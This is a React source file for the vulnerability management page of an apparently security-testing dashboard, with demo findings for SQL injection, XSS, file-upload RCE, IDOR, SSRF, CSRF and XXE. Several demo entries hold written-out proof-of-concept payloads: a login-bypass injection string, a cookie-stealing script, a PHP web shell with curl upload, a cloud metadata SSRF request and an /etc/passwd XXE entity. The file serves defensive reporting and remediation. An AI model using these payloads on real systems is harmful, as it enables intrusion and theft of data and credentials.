/**
 * Vulnerabilities Page - Vulnerability Management
 * Display and manage discovered security vulnerabilities
 * Supports both demo mode (mock data) and real backend data
 */

import { useState, useMemo, useCallback, useEffect } from 'react';
import {
  Box,
  Typography,
  FormControl,
  InputLabel,
  Select,
  MenuItem,
  TextField,
  InputAdornment,
  Grid,
  Paper,
  Chip,
  Button,
  Tabs,
  Tab,
  Alert,
} from '@mui/material';
import BugReportIcon from '@mui/icons-material/BugReport';
import SearchIcon from '@mui/icons-material/Search';
import CalculateIcon from '@mui/icons-material/Calculate';
import ShieldIcon from '@mui/icons-material/Shield';
import ListIcon from '@mui/icons-material/List';
import InfoIcon from '@mui/icons-material/Info';
import { 
  VulnerabilityCard, 
  CVSSCalculator, 
  VulnerabilityDetailDialog,
  RiskScoringSystem 
} from '../components/vulnerabilities';
import { useAppSelector } from '../store';
import type { Vulnerability, VulnerabilityStatus, VulnerabilitySeverity } from '../types';
import { apiClient } from '../services/api';

// Backend vulnerability response interface
interface BackendVulnerability {
  id: string;
  title: string;
  description: string;
  severity: string;
  cvssScore: number;
  cveId?: string;
  cweId?: string;
  location: string;
  discoveredBy: string;
  discoveredAt: string;
  status: string;
  proofOfConcept?: string;
  remediation?: string;
  references?: string[];
}

// Helper to validate vulnerability severity
function validateSeverity(severity: string): VulnerabilitySeverity {
  const validSeverities: VulnerabilitySeverity[] = ['critical', 'high', 'medium', 'low', 'info'];
  return validSeverities.includes(severity as VulnerabilitySeverity) 
    ? (severity as VulnerabilitySeverity) 
    : 'medium';
}

// Helper to validate vulnerability status
function validateStatus(status: string): VulnerabilityStatus {
  const validStatuses: VulnerabilityStatus[] = ['new', 'confirmed', 'false_positive', 'remediated'];
  return validStatuses.includes(status as VulnerabilityStatus) 
    ? (status as VulnerabilityStatus) 
    : 'new';
}

// Helper to transform backend vulnerability to frontend
function transformBackendVuln(vuln: BackendVulnerability): Vulnerability {
  return {
    id: vuln.id,
    title: vuln.title,
    description: vuln.description,
    severity: validateSeverity(vuln.severity),
    cvssScore: vuln.cvssScore,
    cveId: vuln.cveId,
    cweId: vuln.cweId,
    location: vuln.location,
    discoveredBy: vuln.discoveredBy,
    discoveredAt: vuln.discoveredAt,
    status: validateStatus(vuln.status),
    proofOfConcept: vuln.proofOfConcept,
    remediation: vuln.remediation,
    references: vuln.references,
  };
}

// Mock vulnerabilities data for demo mode
const MOCK_VULNERABILITIES: Vulnerability[] = [
  {
    id: '1',
    title: 'SQL Injection - Authentication Bypass',
    description: 'SQL injection vulnerability in login form allows authentication bypass and unauthorized access to admin panel.',
    severity: 'critical',
    cvssScore: 9.8,
    cveId: 'CVE-2024-1234',
    cweId: 'CWE-89',
    location: 'https://example.com/admin/login.php?user=admin',
    discoveredBy: 'BugBounty Agent',
    discoveredAt: new Date().toISOString(),
    status: 'new',
    proofOfConcept: `# SQL Injection PoC
# Vulnerable parameter: user
# Payload: ' OR '1'='1' --

curl -X POST https://example.com/admin/login.php \\
  -d "user=' OR '1'='1' --" \\
  -d "password=anything"

# Result: Authentication bypassed, admin access granted`,
    remediation: 'Use parameterized queries or prepared statements. Never concatenate user input directly into SQL queries. Implement input validation and sanitization. Consider using an ORM framework.',
    references: [
      'https://owasp.org/www-community/attacks/SQL_Injection',
      'https://cwe.mitre.org/data/definitions/89.html',
    ],
  },
  {
    id: '2',
    title: 'Cross-Site Scripting (XSS) - Reflected',
    description: 'Reflected XSS vulnerability in search functionality allows execution of arbitrary JavaScript code in victim browsers.',
    severity: 'high',
    cvssScore: 7.5,
    cveId: 'CVE-2024-5678',
    cweId: 'CWE-79',
    location: 'https://example.com/search?q=<script>alert(1)</script>',
    discoveredBy: 'Web Security Agent',
    discoveredAt: new Date().toISOString(),
    status: 'new',
    proofOfConcept: `# XSS PoC
# Vulnerable parameter: q
# Payload: <script>alert(document.cookie)</script>

https://example.com/search?q=<script>alert(document.cookie)</script>

# Result: JavaScript executed, cookie theft possible`,
    remediation: 'Implement proper output encoding/escaping for all user-controlled data. Use Content Security Policy (CSP) headers. Consider using a web application firewall (WAF).',
    references: [
      'https://owasp.org/www-community/attacks/xss/',
      'https://cwe.mitre.org/data/definitions/79.html',
    ],
  },
  {
    id: '3',
    title: 'Remote Code Execution via File Upload',
    description: 'Unrestricted file upload allows uploading of PHP files, leading to remote code execution on the server.',
    severity: 'critical',
    cvssScore: 9.1,
    cveId: 'CVE-2024-9012',
    cweId: 'CWE-434',
    location: 'https://example.com/upload/profile-picture',
    discoveredBy: 'BugBounty Agent',
    discoveredAt: new Date().toISOString(),
    status: 'confirmed',
    proofOfConcept: `# File Upload RCE PoC
# Create malicious PHP file
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Upload the file
curl -X POST https://example.com/upload/profile-picture \\
  -F "file=@shell.php"

# Execute commands
curl https://example.com/uploads/shell.php?cmd=whoami

# Result: Remote command execution as web server user`,
    remediation: 'Implement strict file type validation. Store uploaded files outside web root. Rename uploaded files. Use a whitelist of allowed file extensions. Scan uploaded files for malware.',
    references: [
      'https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload',
      'https://cwe.mitre.org/data/definitions/434.html',
    ],
  },
  {
    id: '4',
    title: 'Insecure Direct Object Reference (IDOR)',
    description: 'IDOR vulnerability allows accessing other users\' private documents by manipulating document ID parameter.',
    severity: 'high',
    cvssScore: 8.1,
    cweId: 'CWE-639',
    location: 'https://example.com/api/documents/12345',
    discoveredBy: 'Web Security Agent',
    discoveredAt: new Date().toISOString(),
    status: 'new',
    proofOfConcept: `# IDOR PoC
# Normal request (your document)
curl https://example.com/api/documents/12345 \\
  -H "Authorization: Bearer YOUR_TOKEN"

# Modified request (someone else's document)
curl https://example.com/api/documents/12346 \\
  -H "Authorization: Bearer YOUR_TOKEN"

# Result: Access to other users' private documents`,
    remediation: 'Implement proper authorization checks for all resource access. Use indirect references (e.g., session-based mappings). Validate user permissions before serving resources.',
    references: [
      'https://owasp.org/www-community/attacks/Insecure_Direct_Object_References',
      'https://cwe.mitre.org/data/definitions/639.html',
    ],
  },
  {
    id: '5',
    title: 'Server-Side Request Forgery (SSRF)',
    description: 'SSRF vulnerability allows attackers to make requests to internal services and potentially access sensitive data.',
    severity: 'high',
    cvssScore: 7.7,
    cveId: 'CVE-2024-3456',
    cweId: 'CWE-918',
    location: 'https://example.com/api/fetch-url',
    discoveredBy: 'Network Recon',
    discoveredAt: new Date().toISOString(),
    status: 'new',
    proofOfConcept: `# SSRF PoC
# Target internal services
curl -X POST https://example.com/api/fetch-url \\
  -d '{"url": "http://localhost:8080/admin"}'

# Access AWS metadata
curl -X POST https://example.com/api/fetch-url \\
  -d '{"url": "http://169.254.169.254/latest/meta-data/"}'

# Result: Access to internal services and cloud metadata`,
    remediation: 'Implement a whitelist of allowed URLs/domains. Use network segmentation. Disable unnecessary URL schemas (file://, gopher://, etc.). Validate and sanitize user input.',
  },
  {
    id: '6',
    title: 'Cross-Site Request Forgery (CSRF)',
    description: 'Missing CSRF protection allows attackers to perform unauthorized actions on behalf of authenticated users.',
    severity: 'medium',
    cvssScore: 6.5,
    cweId: 'CWE-352',
    location: 'https://example.com/api/change-password',
    discoveredBy: 'Web Security Agent',
    discoveredAt: new Date().toISOString(),
    status: 'new',
    remediation: 'Implement CSRF tokens for all state-changing operations. Use SameSite cookie attribute. Verify Origin/Referer headers.',
  },
  {
    id: '7',
    title: 'Sensitive Data Exposure in API',
    description: 'API endpoint exposes sensitive user information including passwords hashes and personal data without proper authentication.',
    severity: 'critical',
    cvssScore: 9.3,
    cweId: 'CWE-200',
    location: 'https://example.com/api/users/all',
    discoveredBy: 'OSINT Agent',
    discoveredAt: new Date().toISOString(),
    status: 'confirmed',
    remediation: 'Implement proper authentication and authorization. Never expose sensitive data through APIs. Use encryption for data in transit and at rest.',
  },
  {
    id: '8',
    title: 'XML External Entity (XXE) Injection',
    description: 'XML parser processes external entities, allowing file disclosure and SSRF attacks.',
    severity: 'high',
    cvssScore: 8.2,
    cveId: 'CVE-2024-7890',
    cweId: 'CWE-611',
    location: 'https://example.com/api/parse-xml',
    discoveredBy: 'Web Security Agent',
    discoveredAt: new Date().toISOString(),
    status: 'new',
    proofOfConcept: `# XXE PoC
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>`,
    remediation: 'Disable XML external entity processing. Use less complex data formats like JSON when possible. Update XML parsers to latest versions.',
  },
];

const VulnerabilitiesPage = () => {
  const mockDataEnabled = useAppSelector((state) => state.settings.developer.mockDataEnabled);
  const [searchQuery, setSearchQuery] = useState('');
  const [severityFilter, setSeverityFilter] = useState('all');
  const [statusFilter, setStatusFilter] = useState('all');
  const [activeTab, setActiveTab] = useState(0);
  const [selectedVulnerability, setSelectedVulnerability] = useState<Vulnerability | null>(null);
  const [detailDialogOpen, setDetailDialogOpen] = useState(false);
  const [vulnerabilities, setVulnerabilities] = useState<Vulnerability[]>(MOCK_VULNERABILITIES);
  const [backendVulnerabilities, setBackendVulnerabilities] = useState<Vulnerability[]>([]);
  const [isLoading, setIsLoading] = useState(false);

  // Fetch vulnerabilities from backend
  const fetchVulnerabilitiesFromBackend = useCallback(async () => {
    if (mockDataEnabled) return;
    
    setIsLoading(true);
    try {
      const response = await apiClient.listVulnerabilities();
      if (response.success && Array.isArray(response.data)) {
        const transformedVulns = response.data.map((vuln: BackendVulnerability) => transformBackendVuln(vuln));
        setBackendVulnerabilities(transformedVulns);
      }
    } catch (error) {
      console.warn('Failed to fetch vulnerabilities from backend:', error instanceof Error ? error.message : 'Unknown error');
      setBackendVulnerabilities([]);
    } finally {
      setIsLoading(false);
    }
  }, [mockDataEnabled]);

  // Fetch vulnerabilities when component mounts or mockDataEnabled changes
  useEffect(() => {
    if (!mockDataEnabled) {
      fetchVulnerabilitiesFromBackend();
    }
  }, [mockDataEnabled, fetchVulnerabilitiesFromBackend]);

  // Get vulnerabilities based on mock data setting
  const displayedVulnerabilities = mockDataEnabled ? vulnerabilities : backendVulnerabilities;

  const filteredVulnerabilities = useMemo(() => {
    return displayedVulnerabilities.filter((vuln) => {
      const matchesSearch =
        vuln.title.toLowerCase().includes(searchQuery.toLowerCase()) ||
        vuln.description.toLowerCase().includes(searchQuery.toLowerCase()) ||
        vuln.cveId?.toLowerCase().includes(searchQuery.toLowerCase());
      
      const matchesSeverity = severityFilter === 'all' || vuln.severity === severityFilter;
      const matchesStatus = statusFilter === 'all' || vuln.status === statusFilter;

      return matchesSearch && matchesSeverity && matchesStatus;
    });
  }, [displayedVulnerabilities, searchQuery, severityFilter, statusFilter]);

  const vulnerabilityStats = {
    total: displayedVulnerabilities.length,
    critical: displayedVulnerabilities.filter((v) => v.severity === 'critical').length,
    high: displayedVulnerabilities.filter((v) => v.severity === 'high').length,
    medium: displayedVulnerabilities.filter((v) => v.severity === 'medium').length,
    low: displayedVulnerabilities.filter((v) => v.severity === 'low').length,
  };

  const handleViewDetails = useCallback((vuln: Vulnerability) => {
    setSelectedVulnerability(vuln);
    setDetailDialogOpen(true);
  }, []);

  const handleStatusChange = useCallback((id: string, status: VulnerabilityStatus) => {
    setVulnerabilities((prev) => 
      prev.map((v) => v.id === id ? { ...v, status } : v)
    );
  }, []);

  return (
    <Box sx={{ maxWidth: '100%', overflowX: 'hidden' }}>
      {/* Info banner when demo mode is off */}
      {!mockDataEnabled && (
        <Alert 
          severity="info" 
          icon={<InfoIcon />}
          sx={{ mb: 2 }}
        >
          {isLoading 
            ? 'Loading vulnerabilities from backend...' 
            : displayedVulnerabilities.length > 0 
              ? `Showing ${displayedVulnerabilities.length} vulnerabilities from the backend.`
              : 'No vulnerabilities discovered yet. Run a scan to discover vulnerabilities!'}
        </Alert>
      )}
      
      {/* Header */}
      <Box sx={{ 
        display: 'flex', 
        flexDirection: { xs: 'column', sm: 'row' },
        justifyContent: 'space-between', 
        alignItems: { xs: 'flex-start', sm: 'center' }, 
        mb: 3,
        gap: { xs: 1.5, sm: 0 }
      }}>
        <Typography 
          variant="h4" 
          sx={{ 
            fontWeight: 700,
            fontSize: { xs: '1.25rem', sm: '1.75rem', md: '2.125rem' },
          }}
        >
          <BugReportIcon sx={{ mr: 1, verticalAlign: 'middle', fontSize: { xs: '1.25rem', sm: '1.75rem' } }} />
          Vulnerability Management
        </Typography>
        <Box sx={{ display: 'flex', gap: 0.5, flexWrap: 'wrap' }}>
          <Chip
            label={`${vulnerabilityStats.critical} Critical`}
            sx={{ bgcolor: '#b71c1c', color: 'white', fontWeight: 600 }}
            size="small"
          />
          <Chip
            label={`${vulnerabilityStats.high} High`}
            sx={{ bgcolor: '#ff5252', color: 'white', fontWeight: 600 }}
            size="small"
          />
          <Chip
            label={`${vulnerabilityStats.medium} Medium`}
            sx={{ bgcolor: '#ff9800', color: 'white', fontWeight: 600 }}
            size="small"
          />
        </Box>
      </Box>

      {/* Tabs */}
      <Paper sx={{ mb: 3 }}>
        <Tabs
          value={activeTab}
          onChange={(_, newValue) => setActiveTab(newValue)}
          variant="scrollable"
          scrollButtons="auto"
          allowScrollButtonsMobile
          sx={{ borderBottom: 1, borderColor: 'divider' }}
        >
          <Tab icon={<ListIcon />} label="Vulnerabilities" iconPosition="start" sx={{ minWidth: { xs: 'auto', sm: 120 }, px: { xs: 1, sm: 2 } }} />
          <Tab icon={<ShieldIcon />} label="Risk Assessment" iconPosition="start" sx={{ minWidth: { xs: 'auto', sm: 120 }, px: { xs: 1, sm: 2 } }} />
          <Tab icon={<CalculateIcon />} label="CVSS Calculator" iconPosition="start" sx={{ minWidth: { xs: 'auto', sm: 120 }, px: { xs: 1, sm: 2 } }} />
        </Tabs>
      </Paper>

      {/* Vulnerabilities List Tab */}
      {activeTab === 0 && (
        <>
          {/* Filters */}
          <Paper sx={{ p: { xs: 1.5, sm: 2 }, mb: 3 }}>
            <Grid container spacing={{ xs: 1.5, sm: 2 }} alignItems="center">
              <Grid size={{ xs: 12, md: 6 }}>
                <TextField
                  fullWidth
                  placeholder="Search vulnerabilities..."
                  value={searchQuery}
                  onChange={(e) => setSearchQuery(e.target.value)}
                  InputProps={{
                    startAdornment: (
                      <InputAdornment position="start">
                        <SearchIcon />
                      </InputAdornment>
                    ),
                  }}
                />
              </Grid>
              <Grid size={{ xs: 12, md: 3 }}>
                <FormControl fullWidth>
                  <InputLabel>Severity</InputLabel>
                  <Select
                    value={severityFilter}
                    label="Severity"
                    onChange={(e) => setSeverityFilter(e.target.value)}
                  >
                    <MenuItem value="all">All Severities</MenuItem>
                    <MenuItem value="critical">🔴 Critical</MenuItem>
                    <MenuItem value="high">🟠 High</MenuItem>
                    <MenuItem value="medium">🟡 Medium</MenuItem>
                    <MenuItem value="low">🔵 Low</MenuItem>
                    <MenuItem value="info">ℹ️ Info</MenuItem>
                  </Select>
                </FormControl>
              </Grid>
              <Grid size={{ xs: 12, md: 3 }}>
                <FormControl fullWidth>
                  <InputLabel>Status</InputLabel>
                  <Select
                    value={statusFilter}
                    label="Status"
                    onChange={(e) => setStatusFilter(e.target.value)}
                  >
                    <MenuItem value="all">All Statuses</MenuItem>
                    <MenuItem value="new">New</MenuItem>
                    <MenuItem value="confirmed">Confirmed</MenuItem>
                    <MenuItem value="false_positive">False Positive</MenuItem>
                    <MenuItem value="remediated">Remediated</MenuItem>
                  </Select>
                </FormControl>
              </Grid>
            </Grid>
          </Paper>

          {/* Vulnerabilities List */}
          <Box sx={{ display: 'flex', flexDirection: 'column', gap: 3 }}>
            {filteredVulnerabilities.map((vuln) => (
              <VulnerabilityCard 
                key={vuln.id} 
                vulnerability={vuln} 
                onViewDetails={handleViewDetails}
              />
            ))}
          </Box>

          {filteredVulnerabilities.length === 0 && (
            <Box sx={{ textAlign: 'center', py: 8 }}>
              <Typography variant="h6" color="text.secondary">
                No vulnerabilities found matching your criteria
              </Typography>
              <Button
                sx={{ mt: 2 }}
                onClick={() => {
                  setSearchQuery('');
                  setSeverityFilter('all');
                  setStatusFilter('all');
                }}
              >
                Clear Filters
              </Button>
            </Box>
          )}
        </>
      )}

      {/* Risk Assessment Tab */}
      {activeTab === 1 && (
        <RiskScoringSystem 
          vulnerabilities={displayedVulnerabilities}
          projectName="Current Security Assessment"
        />
      )}

      {/* CVSS Calculator Tab */}
      {activeTab === 2 && (
        <CVSSCalculator />
      )}

      {/* Vulnerability Detail Dialog */}
      <VulnerabilityDetailDialog
        open={detailDialogOpen}
        onClose={() => setDetailDialogOpen(false)}
        vulnerability={selectedVulnerability}
        onStatusChange={handleStatusChange}
      />
    </Box>
  );
};

export default VulnerabilitiesPage;
